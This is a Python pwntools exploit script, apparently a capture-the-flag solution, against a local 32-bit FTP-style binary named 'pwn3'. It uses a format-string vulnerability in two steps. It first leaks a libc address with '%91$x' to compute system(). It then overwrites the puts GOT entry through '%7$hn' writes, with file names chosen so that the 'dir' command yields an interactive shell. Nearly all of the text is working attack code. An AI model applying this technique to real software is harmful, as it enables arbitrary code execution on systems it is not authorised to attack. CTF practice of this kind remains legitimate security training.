from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/pwn3'
tar = 'sysbdmin'
name = '' # rxraclhm
for i in tar:
    name += chr(ord(i) - 1)

elf = ELF(path)
puts_got_addr = elf.got['puts'] # 0x804a028

def putfile(p, filename, content):
    p.sendline('put')
    p.recvuntil(':')
    p.sendline(filename)
    p.recvuntil(':')
    p.sendline(content)
    p.recvuntil('ftp>')

def getfile(p, filename):
    p.sendline('get')
    p.recvuntil(':')
    p.sendline(filename)
    return p.recv()

p = process(path)
p.recvline()
p.sendline(name)
p.recvuntil('ftp>')

putfile(p, 'sh;', '%91$x')
res = getfile(p, 'sh;')[:-4]
__libc_start_main_ret_addr = int(res, 16)
system_addr = __libc_start_main_ret_addr - 0x18637 + 0x0003ada0 

# h - 2 bytes
# 7 可以通过查看调用printf时的stack来确定
# aaaa%7$x
payload1 = p32(puts_got_addr) + '%%%dc' % ((system_addr & 0xffff) - 4) + '%7$hn'
putfile(p, 'in/', payload1)
getfile(p, 'in/')
p.recvuntil('ftp>')

payload2 = p32(puts_got_addr + 2) + '%%%dc' % ((system_addr >> 16 & 0xffff) - 4) + '%7$hn'
putfile(p, '/b', payload2)
getfile(p, '/b')
p.recvuntil('ftp>')

p.sendline('dir')
p.interactive()